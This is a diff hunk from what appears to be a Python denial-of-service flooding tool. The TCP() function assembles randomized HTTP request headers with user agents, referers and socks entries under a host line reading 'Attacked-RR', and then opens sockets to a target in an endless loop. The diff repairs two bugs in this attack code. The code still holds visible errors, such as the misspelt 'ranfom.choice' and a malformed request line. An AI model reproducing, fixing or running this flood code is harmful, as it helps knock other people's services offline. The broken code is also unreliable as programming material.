@@ -314,11 +314,11 @@ def TCP():
   global byte1, useragents, socks2, ref
   global time
   Socks = random.choice(socks2)
-  useralive = "UserAgents: "+random.choice(useragents)+random.choice(ref)+random.choice(Connection)+random.choice(socks2)+"\r\n"
+  useralive = "UserAgents: "+random.choice(useragents)+random.choice(ref)+random.choice(socks2)+"\r\n"
   reffer = ranfom.choice(ref)
   get_rand = random.choice(['GET','POST',"HEAD"])
   get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
-  byte_ip = get_host + + useralive + reffer + Socks + get_rand + "\r\n"
+  byte_ip = get_host + useralive + reffer + Socks + get_rand + "\r\n"
   while True:
         try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
